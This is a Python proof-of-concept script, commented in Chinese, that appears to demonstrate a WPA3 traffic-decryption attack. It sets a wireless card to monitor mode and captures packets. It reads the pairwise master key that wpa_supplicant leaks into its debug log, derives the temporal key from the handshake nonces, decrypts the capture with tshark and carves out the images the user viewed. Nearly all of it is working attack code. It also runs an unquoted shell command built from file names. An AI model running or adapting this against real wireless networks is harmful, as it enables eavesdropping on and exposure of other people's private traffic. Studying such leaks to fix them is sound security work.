import re
import struct
import hmac
import hashlib
import subprocess
import os
import sys
import io
import signal
import threading
import time
from scapy.all import rdpcap, Dot11, Dot11Elt
from PIL import Image
import warnings
from PIL import Image 
warnings.filterwarnings("ignore", category=DeprecationWarning)  

class Wifi_Connect_And_Capture:
    def __init__(self):
        # 捕获相关参数
        self.original_interface = ""
        self.monitor_interface = ""
        self.sta_client_interface = ""
        self.channel = ""
        self.capture_file = ''
        self.capture_process = None


    def input_capture_parameters(self):
        """交互式输入捕获参数"""
        print("[*] === WiFi捕获参数配置 ===")
        self.original_interface = input("[+] 请输入原始抓包网卡名称 (如wlp2s0): ").strip()
        self.channel = input("[+] 请输入要监控的信道 (如36): ").strip()
        #self.ssid = input("[+] 请输入目标WiFi的SSID (名称): ").strip()
        self.sta_client_interface = input("[+] 请输入Wifi客户端使用的无线网卡名称(如wlx6c1ff78fe46d): ").strip()
        
        print("\n[*] 配置完成，准备初始化监控模式...")

    def setup_monitor_mode(self):
        """设置网卡为监控模式并配置信道"""
        try:
            print(f"\n[*] 正在启用 {self.original_interface} 的监控模式...")
            # 先关闭可能干扰的进程（关键：避免监控模式启动失败）
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True, text=True)
            # 启动监控模式
            result = subprocess.run(
                ["sudo", "airmon-ng", "start", self.original_interface],
                capture_output=True, text=True, check=True
            )
            
            # 提取监控接口名（确保准确）
            for line in result.stdout.splitlines():
                if "monitor mode enabled on" in line:
                    self.monitor_interface = line.split()[-1]
                    break
            
            if not self.monitor_interface:
                self.monitor_interface = f"{self.original_interface}mon"
                print(f"[*] 自动推断监控接口为: {self.monitor_interface}")

            # 验证监控模式是否生效
            check_mode = subprocess.run(
                ["iwconfig", self.monitor_interface],
                capture_output=True, text=True
            )
            if "Mode:Monitor" not in check_mode.stdout:
                print(f"[ERROR] {self.monitor_interface} 未成功进入监控模式！")
                return False

            # 设置信道
            print(f"[*] 正在设置信道为 {self.channel}...")
            subprocess.run(
                ["sudo", "iwconfig", self.monitor_interface, "channel", self.channel],
                check=True
            )
            
            print(f"[*] 监控模式初始化完成，接口: {self.monitor_interface}，信道: {self.channel}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] 设置监控模式失败: {e.stderr}")
            return False
        except Exception as e:
            print(f"[ERROR] 发生错误: {str(e)}")
            return False

    def cleanup_monitor_mode(self):
        """清理监控模式，恢复网卡正常状态"""
        if self.monitor_interface:
            print(f"\n[*] 正在关闭 {self.monitor_interface} 的监控模式...")
            try:
                # 停止监控模式
                subprocess.run(
                    ["sudo", "airmon-ng", "stop", self.monitor_interface],
                    capture_output=True, text=True
                )
                # 重启网络服务（确保恢复上网）
                subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], capture_output=True, text=True)
                print("[*] 监控模式已关闭，网络已恢复")
            except Exception as e:
                print(f"[ERROR] 清理监控模式时发生错误: {str(e)}")

    def start_capture(self):
        """开始一次捕获（关键修改：强制输出传统pcap格式）"""
        # 自定义文件名
        default_filename = f"capture_wifi.pcap"
        filename = input(f"[+] 请输入捕获的文件名 (默认: {default_filename}): ").strip()
        if not filename:
            filename = default_filename
        
        cmd = ["tshark", "-i", self.monitor_interface, "-w", filename, "-F", "pcap", "-q"]
        
        print(f"\n[*] 开始捕获（格式：传统pcap），数据将保存到 {filename}")
        
        # 启动tshark进程
        try:
            self.capture_process = subprocess.Popen(cmd)
        except Exception as e:
            print(f"[ERROR] 启动捕获进程失败: {str(e)}")
            return None
        
        return filename

    def monitor_stop_command(self):
        """监控停止命令输入"""
        while self.capture_process and self.capture_process.poll() is None:
            try:
                key = input().strip().lower()
                if key == 'qt':
                    print("[*] 正在停止捕获...")
                    # 优雅终止tshark（确保数据写入文件）
                    if self.capture_process:
                        self.capture_process.send_signal(signal.SIGINT)
                        time.sleep(1.5)  # 延长等待时间，确保文件刷新
                        if self.capture_process.poll() is None:
                            self.capture_process.terminate()
                            time.sleep(0.5)
                    break
                elif key == '':
                    print("[*] 捕获正在进行中，按Q并回车停止")
            except Exception as e:
                print(f"[ERROR] 监控停止命令时出错: {str(e)}")
                break
                
    def run_wpa_supplicant(self):
        """
                执行wpa_supplicant命令，支持自定义接口名和日志序号，按q终止进程
        """
        # 构建命令和日志路径
        log_path = f"wpa_supplicant.log"
        wpa_conf_path = "/etc/wpa_supplicant/wpa_supplicant.conf"
    
        # 校验配置文件是否存在
        if not os.path.exists(wpa_conf_path):
            print(f"错误：配置文件{wpa_conf_path}不存在")
            return
    
        # 构建wpa_supplicant命令（列表形式避免shell注入）
        cmd = [
            "wpa_supplicant",
            "-i", self.sta_client_interface,
            "-c", wpa_conf_path,
            "-K"  # 输出密钥信息到日志
        ]
        print(f"[*] 即将启动STA客户端，执行wpa_supplicant ...")
        print(f"[*] 正在启动wpa_supplicant...\n")

        # 启动wpa_supplicant进程（重定向输出到日志）
        try:
            # 以文本模式打开日志文件，重写输出
            with open(log_path, "w", encoding="utf-8") as log_file:
                # 启动进程（stdout/stderr都重定向到日志）
                wpa_proc = subprocess.Popen(
                    cmd,
                    stdout=log_file,
                    stderr=subprocess.STDOUT,  # 错误信息也写入日志
                    text=True
                )
                print(f"[*] wpa_supplicant进程已启动，STA入网成功！")
        except Exception as e:
            print(f" 启动wpa_supplicant失败：{str(e)}")
            return
        print(f"[*] 你可以访问http://192.168.100.100/img模拟用户上网!\n")
        
        print(f"[*] 输入 'qw' 并回车可终止wpa_supplicant wifi客户端进程!\n")
        
        # 4. 线程：监听用户输入，输入q则终止进程
        def monitor_user_input():
            while True:
                user_input = input()
                if user_input.strip().lower() == "qw":
                    print(f"\n[*] 收到终止指令，正在停止wpa_supplicant...")
                    # 发送SIGTERM信号终止进程（优雅退出）
                    os.kill(wpa_proc.pid, signal.SIGTERM)
                    time.sleep(1)
                    # 若未退出则强制终止
                    if wpa_proc.poll() is None:
                        os.kill(wpa_proc.pid, signal.SIGKILL)
                        print(f"[WARNING] 已强制终止wpa_supplicant进程（PID：{wpa_proc.pid}）")
                    else:
                        print(f"[*] 已正常终止wpa_supplicant进程（PID：{wpa_proc.pid}）")
                    print(f"[*] 日志已保存至：{os.path.abspath(log_path)}")
                    break

        # 启动监听线程（避免阻塞主进程）
        input_thread = threading.Thread(target=monitor_user_input, daemon=True)
        input_thread.start()

        # 5. 主进程等待wpa_supplicant进程结束
        wpa_proc.wait()
        print(f"\n[*] wpa_supplicant进程（PID：{wpa_proc.pid}）已退出")

    def run(self):
        """运行完整流程"""
        self.input_capture_parameters()
        
        if not self.setup_monitor_mode():
            print("[ERROR] 无法初始化监控模式，程序退出")
            return
        
        try:
            # 执行Wifi报文捕获
            print(f"\n[*] 启动Wifi报文捕获程序，并等待STA客户端入网，开始捕获Wifi报文...")
            print(f"[*] 正在启动无线报文捕获程序，尝试抓取WPA3报文，按回车开始捕获...\n")
            input()
            captured_file = self.start_capture()
                
            print(f"\n[*] 首先启动wpa_supplicant,并且模拟用户上网...")
            self.run_wpa_supplicant()
            
            # 监控停止命令
            print("[*] 模拟上网过程完成，STA客户端已下限，按'qt'并回车停止Wifi报文捕获...")
            self.monitor_stop_command()
            # 验证文件有效性（必须存在且大小>1KB，避免空文件）
            if os.path.exists(captured_file):
                file_size = os.path.getsize(captured_file)
                if file_size > 1024:  # 大于1KB视为有效（空pcap约24字节）
                    self.capture_file = captured_file
                    print(f"[*] 捕获文件有效，大小: {file_size} 字节")
                else:
                    print(f"[WARNING] 捕获文件 {captured_file} 过小（{file_size} 字节），可能是空文件，已删除，程序即将退出...")
                    os.remove(captured_file)  # 删除无效空文件
                    sys.exit(0)
            else:
                print(f"[WARNING] 捕获文件 {captured_file} 未生成，请重新捕获，程序即将退出...")
                sys.exit(0)
                
            print("\n[*] STA客户端上网完成，Wifi报文捕获成功！")
            print(f"[*] 有效捕获文件: {self.capture_file}")
            
        finally:
            self.cleanup_monitor_mode()
            print("\n[*] ============= OK，客户端上网及Wifi捕获全部流程结束！=============")
        

def extract_pmk_from_log(log_path):
    """
    从wpa_supplicant.log提取PMK（十六进制字符串，无空格）
    :param log_path: 日志文件路径
    :return: PMK十六进制字符串（32字节=64字符）
    """
    # 匹配PMK行，兼容空格和大小写
    pmk_pattern = r"WPA: PMK - hexdump\(len=32\): ([0-9a-fA-F\s]+)"
    with open(log_path, "r", encoding="utf-8") as f:
        log_content = f.read()
    
    match = re.search(pmk_pattern, log_content)
    if not match:
        raise ValueError("未从日志文件中找到PMK信息，请检查日志格式（需包含'WPA: PMK - hexdump(len=32):'）")
    
    # 1. 提取匹配内容，去除所有空格
    pmk_raw = match.group(1).replace(" ", "").strip()
    # 2. 过滤非十六进制字符（防止换行符、制表符等干扰）
    valid_chars = "0123456789abcdefABCDEF"
    pmk_hex = "".join([c for c in pmk_raw if c in valid_chars]).lower()
    
    # 3. 校验长度（32字节=64个十六进制字符）
    if len(pmk_hex) != 64:
        raise ValueError(
            f"提取的PMK长度异常（应为64字符），当前：{len(pmk_hex)}字符\n"
            f"原始提取内容：{pmk_raw}\n"
            f"过滤后内容：{pmk_hex}\n"
            "请检查日志中PMK行是否有多余字符（如换行、制表符）"
        )
    return pmk_hex

def parse_handshake_from_pcap(pcap_path):
    packets = rdpcap(pcap_path)
    handshake_info = {
        "sta_mac_hex": None,
        "ap_mac_hex": None,
        "nonce1_hex": None,
        "nonce2_hex": None
    }
    nonce_count = 0

    for pkt in packets:
        if not (pkt.haslayer("Dot11") and pkt.type == 2 and pkt.haslayer("LLC")):
            continue
        
        llc_data = bytes(pkt.getlayer("LLC"))
        eapol_data = None
        
        if len(llc_data) >= 8 and llc_data[:3] == b"\xaa\xaa\x03" and llc_data[3:6] == b"\x00\x00\x00" and llc_data[6:8] == b"\x88\x8e":
            eapol_data = llc_data[8:]
        else:
            continue
        
        dot11 = pkt.getlayer("Dot11")
        to_ds = dot11.FCfield & 0x01
        from_ds = dot11.FCfield & 0x02
        
        # 修复MAC角色判断：确保STA是A1（6c:1f:f7:8f:e4:6d），AP是A2（94:90:10:8d:14:50）
        if to_ds == 1 and from_ds == 0:
            current_sta = dot11.addr2
            current_ap = dot11.addr1
        else:
            current_sta = dot11.addr1
            current_ap = dot11.addr2
        
        if current_sta and not handshake_info["sta_mac_hex"]:
            handshake_info["sta_mac_hex"] = current_sta.replace(":", "").lower()
        if current_ap and not handshake_info["ap_mac_hex"]:
            handshake_info["ap_mac_hex"] = current_ap.replace(":", "").lower()
        
        # 修复Nonce偏移（从15字节开始）
        if len(eapol_data) >= 0x11 + 32 and nonce_count < 2:
            nonce = eapol_data[0x11:0x11+32]
            nonce_hex = nonce.hex().lower()
            if nonce_hex != "00"*32:
                if not handshake_info["nonce1_hex"]:
                    handshake_info["nonce1_hex"] = nonce_hex
                    nonce_count += 1
                elif not handshake_info["nonce2_hex"] and nonce_hex != handshake_info["nonce1_hex"]:
                    handshake_info["nonce2_hex"] = nonce_hex
                    nonce_count += 1
        
        if all(handshake_info.values()):
            break

    missing = [k for k, v in handshake_info.items() if not v]
    if missing:
        raise ValueError(f"PCAP解析失败，PCAP中缺少关键信息：{', '.join(missing)}")
    
    return handshake_info


def generate_data(ap_mac_hex, sta_mac_hex, nonce1_hex, nonce2_hex):
    """
    生成PTK计算所需的Data字段（76字节），对齐wpa_supplicant逻辑
    :param ap_mac_hex: AP MAC十六进制（无冒号）
    :param sta_mac_hex: STA MAC十六进制（无冒号）
    :param nonce1_hex: Nonce1十六进制（无空格）
    :param nonce2_hex: Nonce2十六进制（无空格）
    :return: Data字节流（76字节）
    """
    # 转换为字节流
    ap_mac = bytes.fromhex(ap_mac_hex)
    sta_mac = bytes.fromhex(sta_mac_hex)
    nonce1 = bytes.fromhex(nonce1_hex)
    nonce2 = bytes.fromhex(nonce2_hex)

    # 1. MAC排序：min(STA, AP) + max(STA, AP)（12字节）
    sorted_macs = sta_mac + ap_mac if sta_mac < ap_mac else ap_mac + sta_mac
    # 2. Nonce排序：min(Nonce1, Nonce2) + max(Nonce1, Nonce2)（64字节）
    sorted_nonces = nonce1 + nonce2 if nonce1 < nonce2 else nonce2 + nonce1
    # 3. 拼接Data（12+64=76字节）
    return sorted_macs + sorted_nonces


def sha256_prf_bits(key, label, data, buf_len_bits):
    """
    实现wpa_supplicant的sha256_prf_bits函数，计算PTK
    :param key: PMK字节流
    :param label: 固定标签（"Pairwise key expansion"）
    :param data: 生成的Data字节流
    :param buf_len_bits: PTK长度（384比特=48字节）
    :return: PTK字节流（48字节）
    """
    buf_len = (buf_len_bits + 7) // 8  # 转为字节数
    ptk = b""
    counter = 1

    while len(ptk) < buf_len:
        # 小端序计数器（2字节）
        counter_le = struct.pack("<H", counter)
        # 标签ASCII编码
        label_bytes = label.encode("ascii")
        # 小端序长度（2字节，比特数）
        length_le = struct.pack("<H", buf_len_bits)
        # 拼接HMAC输入：counter_le + label + data + length_le
        msg = counter_le + label_bytes + data + length_le
        # HMAC-SHA256计算
        hmac_result = hmac.new(key, msg, hashlib.sha256).digest()
        # 截取所需长度
        remaining = buf_len - len(ptk)
        ptk += hmac_result[:remaining]
        counter += 1

    return ptk


def calculate_tk(pmk_hex, handshake_info):
    """
    计算PTK和TK（TK是PTK的后16字节）
    :param pmk_hex: PMK十六进制字符串
    :param handshake_info: 握手信息字典（含MAC和Nonce）
    :return: TK十六进制字符串（16字节=32字符）
    """
    # 1. 解析输入参数
    pmk = bytes.fromhex(pmk_hex)
    ap_mac_hex = handshake_info["ap_mac_hex"]
    sta_mac_hex = handshake_info["sta_mac_hex"]
    nonce1_hex = handshake_info["nonce1_hex"]
    nonce2_hex = handshake_info["nonce2_hex"]

    # 2. 生成Data字段
    data = generate_data(ap_mac_hex, sta_mac_hex, nonce1_hex, nonce2_hex)

    # 3. 计算PTK（384比特=48字节）
    label = "Pairwise key expansion"
    buf_len_bits = 384
    ptk = sha256_prf_bits(pmk, label, data, buf_len_bits)

    # 4. 提取TK（PTK的后16字节）
    tk = ptk[-16:]  # TK=PTK[32:48]
    tk_hex = tk.hex().lower()
    print(f"计算完成：\n- PTK（48字节）: {ptk.hex().lower()}\n- TK（16字节）: {tk_hex}")
    return tk_hex


def decrypt_pcap_with_tshark(input_pcap, tk_hex, output_bin):
    """
            使用tshark配置tk参数进行解密，对解密的数据固定提取TCP payload，过滤TCP数据包，解密PCAP并保存为二进制
    """
    # 验证输入文件
    if not os.path.exists(input_pcap):
        print(f"错误：输入文件 {input_pcap} 不存在")
        return False
    
    try:
        # 构建完整命令字符串（因参数固定，可直接拼接）
        cmd = (
            f"tshark -r {input_pcap} "
            f'-o "wlan.enable_decryption:TRUE" '
            f'-o "uat:80211_keys:\\"tk\\",\\"{tk_hex}\\"" '
            "-Y tcp -T fields -e tcp.payload "
            "| tr -d '\\n' "
            f"| xxd -r -p > {output_bin}"
        )
        
        # 执行命令（使用shell=True直接运行完整命令）
        result = subprocess.run(
            cmd,
            shell=True,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # 验证输出文件
        if not os.path.exists(output_bin):
            print(f"错误：未生成输出文件 {output_bin}")
            return False
        
        print(f"成功提取TCP payload至 {output_bin}（大小：{os.path.getsize(output_bin)/1024:.2f} KB）")
        return True
    
    except subprocess.CalledProcessError as e:
        print(f"命令执行失败：{e.stderr}")
        return False
    except Exception as e:
        print(f"出错：{str(e)}")
        return False

def extract_all_images_from_decrypt_data(bin_path, output_dir):
    """
    提取所有JPG/JPEG/PNG图片，过滤无法打开的错误图片：
    1. 保留逐字节滑动搜索逻辑，确保不漏提
    2. 新增图片有效性验证，仅保存能正常打开的图片
    """
    os.makedirs(output_dir, exist_ok=True)
    
    # 读取二进制数据
    with open(bin_path, "rb") as f:
        bin_data = f.read()
    total_size = len(bin_data)
    print(f"读取二进制数据，总大小：{total_size / 1024:.2f} KB")

    # 魔术数配置（JPG/JPEG共用魔术数，统一处理）
    magic_config = [
        {
            "name": "jpg",  # 包含jpg和jpeg
            "magic": b"\xFF\xD8",
            "eof": b"\xFF\xD9",
            "min_size": 1024,
            "max_size": 10 * 1024 * 1024  # 单张最大10MB
        },
        {
            "name": "png",
            "magic": b"\x89\x50\x4E\x47",
            "eof": b"\x49\x45\x4E\x44\xAE\x42\x60\x82",
            "min_size": 1024,
            "max_size": 10 * 1024 * 1024
        }
    ]

    img_count = 1
    valid_count = 1  # 有效图片计数
    processed = set()  # 存储已处理的魔术数位置（去重）

    print(f"\n开始提取图片...")
    # 遍历两种格式
    for cfg in magic_config:
        magic = cfg["magic"]
        magic_len = len(magic)
        img_type = cfg["name"]

        # 逐字节滑动搜索魔术数
        pos = 0
        while pos <= total_size - magic_len:
            # 查找当前位置后的魔术数
            pos = bin_data.find(magic, pos)
            if pos == -1:
                break  # 无更多该格式魔术数

            # 去重：跳过已处理的位置
            if pos in processed:
                pos += 1
                continue
            processed.add(pos)

            # 计算图片数据范围
            start = pos
            end = start + cfg["max_size"]
            if end > total_size:
                end = total_size

            # 提取候选数据
            candidate = bin_data[start:end]
            if len(candidate) < cfg["min_size"]:
                pos += 1
                continue

            # 尝试定位结束符（提高完整性）
            eof_pos = candidate.rfind(cfg["eof"])
            if eof_pos != -1:
                candidate = candidate[:eof_pos + len(cfg["eof"])]

            # 核心新增：验证图片是否可打开（过滤错误图片）
            try:
                # 用PIL尝试打开图片
                img = Image.open(io.BytesIO(candidate))
                img.load()  # 加载图片数据（能加载说明图片有效）
                # 尝试简单处理（如转换模式），进一步验证
                img.convert("RGB")
            except Exception as e:
                # 无法打开的图片（错误图片），直接跳过
                pos += 1
                continue

            # 保存有效图片
            img_path = os.path.join(output_dir, f"valid_image_{valid_count}_{img_type}.{img_type}")
            with open(img_path, "wb") as f:
                f.write(candidate)

            print(f"  提取有效{img_type.upper()}：{os.path.basename(img_path)}（大小：{len(candidate)/1024:.2f} KB）")
            valid_count += 1
            img_count += 1
            pos += 1  # 移动1字节，确保后续魔术数不被跳过

    print(f"\n提取完成！共得到 {valid_count - 1} 张有效图片，保存至 {output_dir}")

def main():
    """主函数：串联全流程"""
    # -------------------------- 1. 尝试wpa_supplicant连接WIfi上网、抓包--------------------------
    try:
        wifi_pcap = Wifi_Connect_And_Capture()
        wifi_pcap.run()
    except KeyboardInterrupt:
        print("\n[ERROR] 程序被用户手动中断")
        if 'analyzer' in locals():
            analyzer.cleanup_monitor_mode()
        sys.exit(0)
    except Exception as e:
        print(f"[ERROR] 程序全局错误: {str(e)}")
        if 'analyzer' in locals():
            analyzer.cleanup_monitor_mode()
        sys.exit(1)
    
    # -------------------------- 2. 配置参数（根据实际路径修改）--------------------------
    LOG_PATH = "wpa_supplicant.log"    # wpa_supplicant日志路径
    INPUT_PCAP = wifi_pcap.capture_file          # 加密PCAP路径
    DECRYPTED_OUTPUT = "decrypted_tcp_raw_data"     # 解密后PCAP路径
    IMAGE_SAVE_DIR = "extracted_images"# 图片保存目录

    print(f"\n==================================================================")
    print(f"[*] 已经得到Wifi的口空报文PCAP文件，现在开始解密流程...")
    print(f"==================================================================")
    try:
        # -------------------------- 3. 窃取PMK --------------------------
        print(f"\n[*] 步骤1：从wpa_wupplicant客户端的敏感信息泄露中窃取PMK...")
        pmk_hex = extract_pmk_from_log(LOG_PATH)
        print(f"[*] PMK窃取成功，窃取的PMK（32字节）: {pmk_hex}")

        # -------------------------- 4. 解析PCAP握手信息 --------------------------
        print(f"\n[*] 步骤2：从捕获的PCAP中提取握手信息并解析NONCE...")
        handshake_info = parse_handshake_from_pcap(INPUT_PCAP)
        print(f"解析结果：\n- STA MAC: {handshake_info['sta_mac_hex']}\n- AP MAC: {handshake_info['ap_mac_hex']}\n- Nonce1: {handshake_info['nonce1_hex']}\n- Nonce2: {handshake_info['nonce2_hex']}")

        # -------------------------- 5. 计算TK --------------------------
        print("\n[*] 步骤3：根据窃取的PMK、NONCE数据计算出WPA3的工作密钥PTK和TK...")
        tk_hex = calculate_tk(pmk_hex, handshake_info)

        # -------------------------- 6. 调用tshark解密PCAP --------------------------
        print("\n[*] 步骤4：使用工作密钥TK对PCAP包进行解密，并提取解密包的应用层数据...")
        decrypt_success = decrypt_pcap_with_tshark(INPUT_PCAP, tk_hex, DECRYPTED_OUTPUT) 
        if not decrypt_success:
            raise Exception("PCAP解密失败，终止流程")

        # -------------------------- 7. 提取图片数据 --------------------------
        print("\n[*] 步骤5：解析解密出来的应用曾数据，获取其中的图片数据，并提取图片保存...")
        extract_all_images_from_decrypt_data(DECRYPTED_OUTPUT,IMAGE_SAVE_DIR)

        print("\n[*] SUCCESS! 成功完成WIFI入网、抓包、解密、数据提取的全流程！")

    except Exception as e:
        print(f"\n[ERROR] 解密提取流程异常终止：{str(e)}")
        if "缺少关键信息：nonce" in str(e):
            print("\n[ERROR] PCAP中缺乏计算工作密钥TK的关键元素NONCE，无法解密...")


if __name__ == "__main__":
    main()
